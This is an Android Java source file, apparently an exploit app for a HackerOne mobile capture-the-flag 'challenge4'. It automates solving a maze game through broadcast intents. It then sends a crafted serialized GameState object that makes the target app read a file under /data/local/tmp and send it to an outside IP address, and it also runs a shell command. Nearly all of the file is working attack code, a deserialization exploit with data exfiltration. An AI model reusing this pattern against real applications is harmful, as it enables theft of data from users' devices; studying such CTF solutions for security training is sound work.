package com.fpasswdpwn.challenge4_exploit;

import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.os.Bundle;
import android.os.Handler;
import android.os.IBinder;
import android.support.annotation.Nullable;
import android.util.Log;

import com.hackerone.mobile.challenge4.BroadcastAnnouncer;
import com.hackerone.mobile.challenge4.GameState;
import com.hackerone.mobile.challenge4.StateController;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.Serializable;
import java.util.ArrayList;
import java.util.HashMap;

public class pwnService extends Service {

    boolean wallsReady = false;
    boolean positionsReady = false;
    boolean[][] walls;
    ArrayList<Integer> positions = new ArrayList<>();
    ArrayList<Character> solutions = null;
    ArrayList<Integer> solutionsX = null;
    ArrayList<Integer> solutionsY = null;
    public static int mazeSolved = 0;
    public BroadcastReceiver recv = null;
    public BroadcastReceiver recv1 = null;
    boolean[][] visited;
    private static final int[] dx = {-1, 0, 0, 1};
    private static final int[] dy = {0, -1, 1, 0};
    private static final char[] dir = {'h', 'k', 'j', 'l'};
    boolean solving = false;
    HashMap<boolean[][], Boolean> solved = new HashMap<>();

    @Override
    public void onCreate() {
        super.onCreate();
        recv1 = new BroadcastReceiver() {
            @Override
            public void onReceive(Context context, Intent intent) {
                Log.d(pwn.pwnTag, "onReceive is called");
                Bundle extras = intent.getExtras();
                if (extras != null) {
                    if (intent.hasExtra("move")) {
                        Log.d(pwn.pwnTag, "move is received");
                        String x = extras.getString("move");
                        Character c = x.charAt(0);
                        Log.d(pwn.pwnTag, "Move is " + String.valueOf(c));
                        Intent moveIntent = new Intent();
                        moveIntent.putExtra("move", c);
                        moveIntent.setAction("com.hackerone.mobile.challenge4.broadcast.MAZE_MOVER");
                        context.sendBroadcast(moveIntent);
                        Log.d(pwn.pwnTag, "move sent");
                    }
                    if (intent.hasExtra("start_game")) {
                        Log.d(pwn.pwnTag, "start_game rececived");
                        Intent startMaze = new Intent();
                        startMaze.setAction("com.hackerone.mobile.challenge4.menu");
                        startMaze.putExtra("start_game", "");
                        context.sendBroadcast(startMaze);
                        Log.d(pwn.pwnTag, "start_game sent");
                    }
                    if (intent.hasExtra("get_maze")) {
                        Log.d(pwn.pwnTag, "get_maze received");
                        Intent getMaze = new Intent();
                        getMaze.setAction("com.hackerone.mobile.challenge4.broadcast.MAZE_MOVER");
                        getMaze.putExtra("get_maze", "");
                        context.sendBroadcast(getMaze);
                        Log.d(pwn.pwnTag, "get_maze sent");
                    }
                    if (intent.hasExtra("cereal") || intent.hasExtra("pwn")) {
                        Log.d(pwn.pwnTag, "cereal received");
                        Intent pwnshit = new Intent();
                        pwnshit.setAction("com.hackerone.mobile.challenge4.broadcast.MAZE_MOVER");
                        String filePath = "/data/local/tmp/challenge4";
                        Log.d(pwn.pwnTag, "filePath = " + filePath);
                        StateController pwnStateLoader = new BroadcastAnnouncer("MazeGame", filePath, "http://18.206.31.34");
                        Serializable payload1 = new GameState("PWNED", pwnStateLoader);
                        Intent pwnshit1 = new Intent();
                        pwnshit1.setAction("com.hackerone.mobile.challenge4.broadcast.MAZE_MOVER");
                        pwnshit1.putExtra("cereal", payload1);
                        context.sendBroadcast(pwnshit1);
                        Log.d(pwn.pwnTag, "cereal payload1 sent");
                        Log.d(pwn.pwnTag, "cereal sent");
                    }
                }
            }
        };
        registerReceiver(recv1, new IntentFilter("com.fpasswdpwn.challenge4_exploit.exploit"));

        recv = new BroadcastReceiver() {
            @Override
            public void onReceive(Context context, Intent intent) {

                Bundle extras = intent.getExtras();
                if (extras != null) {
                    if (intent.hasExtra("move_result")) {
                        Log.d(pwn.pwnTag, "move_result received");
                        String moveResult = extras.getString("move_result");
                        Log.d(pwn.pwnTag, "move_result: " + moveResult);
                    }
                    if (intent.hasExtra("walls")) {
                        Log.d(pwn.pwnTag, "walls received");
                        if (!wallsReady) {
                            walls = (boolean[][]) extras.getSerializable("walls");
                            Log.d(pwn.pwnTag, "walls length = " + walls.length);
//                            String wallsString = "\n";
//                            for (int i = 0; i < walls.length; i++) {
//                                for (int j = 0; j < walls.length; j++) {
//                                    wallsString += walls[i][j] ? "1 " : "0 ";
//                                }
//                                wallsString += "\n";
//                            }
//                            Log.d(pwn.pwnTag, "walls = " + wallsString);
                            wallsReady = true;
                            if (wallsReady && positionsReady) {
                                solving = true;
                                if (!solved.containsKey(walls)) {
                                    solveMaze();
                                    solved.put(walls, true);
                                }
                                solving = false;
                                wallsReady = false;
                                positionsReady = false;
                                walls = null;
                                positions = null;
                                return;
                            }
                        }
                    }
                    if (intent.hasExtra("positions")) {
                        Log.d(pwn.pwnTag, "positions rececived");
                        if (!positionsReady) {
                            positions = extras.getIntegerArrayList("positions");
                            Log.d(pwn.pwnTag, "positions length = " + positions.size());
//                            String positionsString = "";
//                            for (int i = 0; i < positions.size(); i++) {
//                                positionsString += " " + Integer.toString(positions.get(i));
//                            }
//                            Log.d(pwn.pwnTag, "positions = " + positionsString);
                            positionsReady = true;
                            if (wallsReady && positionsReady) {
                                solving = true;
                                if (!solved.containsKey(walls)) {
                                    solveMaze();
                                    solved.put(walls, true);
                                }
                                solving = false;
                                wallsReady = false;
                                positionsReady = false;
                                walls = null;
                                positions = null;
                            }
                        }
                    }
                }
            }
        };

        registerReceiver(recv, new IntentFilter("com.hackerone.mobile.challenge4.broadcast.MAZE_MOVER"));

        Intent startMaze = new Intent();
        //startMaze.setAction("com.fpasswdpwn.challenge4_exploit.exploit");
        startMaze.setAction("com.hackerone.mobile.challenge4.menu");
        startMaze.putExtra("start_game", "");
        sendBroadcast(startMaze);
        Log.d(pwn.pwnTag, "Broadcast sent, game should be starting");

        for (int i = 0; i < 1; i++) {
            final Intent getMaze = new Intent();
            //getMaze.setAction("com.fpasswdpwn.challenge4_exploit.exploit");
            getMaze.setAction("com.hackerone.mobile.challenge4.broadcast.MAZE_MOVER");
            getMaze.putExtra("get_maze", "");

            final Intent i1 = new Intent();
            i1.setAction("com.fpasswdpwn.challenge4_exploit.exploit");
            i1.putExtra("cereal", "");

            Handler handler = new Handler();

            handler.postDelayed(new Runnable() {
                @Override
                public void run() {
                    sendBroadcast(getMaze);
                    Log.d(pwn.pwnTag, "get_maze sent");

                }
            }, 10000);

            handler.postDelayed(new Runnable() {
                @Override
                public void run() {
                    sendBroadcast(i1);
                    Log.d(pwn.pwnTag, "exploit sent");
                }
            }, 15000);

            handler.postDelayed(new Runnable() {
                @Override
                public void run() {
                    sendBroadcast(getMaze);
                    Log.d(pwn.pwnTag, "get_maze sent");

                }
            }, 20000);

            handler.postDelayed(new Runnable() {
                @Override
                public void run() {
                    sendBroadcast(i1);
                    Log.d(pwn.pwnTag, "exploit sent");
                }
            }, 25000);

            handler.postDelayed(new Runnable() {
                @Override
                public void run() {
                    sendBroadcast(getMaze);
                    Log.d(pwn.pwnTag, "get_maze sent");

                }
            }, 30000);

            handler.postDelayed(new Runnable() {
                @Override
                public void run() {
                    sendBroadcast(i1);
                    Log.d(pwn.pwnTag, "exploit sent");
                }
            }, 35000);

            handler.postDelayed(new Runnable() {
                @Override
                public void run() {
                    sendBroadcast(getMaze);
                    Log.d(pwn.pwnTag, "get_maze sent");

                }
            }, 40000);

            handler.postDelayed(new Runnable() {
                @Override
                public void run() {
                    sendBroadcast(i1);
                    Log.d(pwn.pwnTag, "exploit sent");
                }
            }, 45000);

            handler.postDelayed(new Runnable() {
                @Override
                public void run() {
                    try {
                        Process process;
                        process = Runtime.getRuntime().exec("id && am start -n \"com.fpasswdpwn.challenge4_exploit/.MainActivity\"");
                        BufferedReader in = new BufferedReader(new
                                InputStreamReader(process.getInputStream()));
                        String sCurrentLine;

                        while ((sCurrentLine = in.readLine()) != null) {
                            Log.d(pwn.pwnTag, sCurrentLine);
                        }
                    } catch (IOException e) {
                        // TODO Auto-generated catch block
                        e.printStackTrace();
                    }
                }
            }, 50000);


        }
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        Log.d(pwn.pwnTag, "Service binded");
        return null;
    }

    @Override
    public void onDestroy() {
        Log.d(pwn.pwnTag, "Service destroyed");
        super.onDestroy();
        unregisterReceiver(recv);
        unregisterReceiver(recv1);
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        return super.onStartCommand(intent, flags, startId);
    }

    public void solveMaze() {
        Log.d(pwn.pwnTag, "start solving maze");
        visited = new boolean[100][100];
        solutions = new ArrayList<>();
        solutionsX = new ArrayList<>();
        solutionsY = new ArrayList<>();

        for (int i = 0; i < 100; i++) {
            for (int j = 0; j < 100; j++) {
                visited[i][j] = false;
            }
        }
        boolean found = DFS(positions.get(0), positions.get(1), positions.get(2), positions.get(3));
        if (found) {
            Log.d(pwn.pwnTag, "Path found");
            String path = "";
            for (int i = 0; i < solutions.size(); i++) {
                path += solutions.get(i);
                Log.d(pwn.pwnTag, "" + solutionsX.get(i) + " " + solutionsY.get(i));
            }
            Log.d(pwn.pwnTag, "PATH = " + path);
            solutions = finalizeSolution(solutions);
            path = "";
            for (int i = 0; i < solutions.size(); i++) {
                path += solutions.get(i);
            }
            Log.d(pwn.pwnTag, "FINALIZED PATH = " + path);
            for (int i = 0; i < solutions.size(); i++) {
                Intent makeMove = new Intent();
                makeMove.setAction("com.fpasswdpwn.challenge4_exploit.exploit");
                makeMove.putExtra("move", "" + solutions.get(i));
                sendBroadcast(makeMove);
                Log.d(pwn.pwnTag, "solution move sent");
            }
        }
        mazeSolved += 1;
        Log.d(pwn.pwnTag, "finished solving maze");
    }

    public boolean isInside(int x, int y) {
        return 0 <= x && x < walls.length && 0 <= y && y < walls.length;
    }

    public ArrayList<Character> finalizeSolution(ArrayList<Character> lst) {
        ArrayList<Character> finalSolution = new ArrayList<>();
        for (int i = 0; i < lst.size(); i++) {
            char m = lst.get(i);
            int x = solutionsX.get(i);
            int y = solutionsY.get(i);

            if (m == 'h' || m == 'l') {
                if (walls[y - 1][x] || walls[y + 1][x]) {
                    finalSolution.add(m);
                }
            } else if (m == 'j' || m == 'k') {
                if (walls[y][x - 1] || walls[y][x + 1]) {
                    finalSolution.add(m);
                }
            }
        }
        finalSolution.add(lst.get(lst.size() - 1));
        return finalSolution;
    }

    public boolean DFS(int playerX, int playerY, int destX, int destY) {
        visited[playerX][playerY] = true;
        if (playerX == destX && playerY == destY) {
            return true;
        }
        for (int i = 0; i < 4; i++) {
            int x = playerX + dx[i];
            int y = playerY + dy[i];
            if (!isInside(x, y)) {
                continue;
            }
            if (visited[x][y] || (!walls[y][x])) {
                continue;
            }
            boolean found = DFS(x, y, destX, destY);
            if (found) {
                solutions.add(0, dir[i]);
                solutionsX.add(0, x);
                solutionsY.add(0, y);
                return found;
            }
        }
        return false;
    }
}
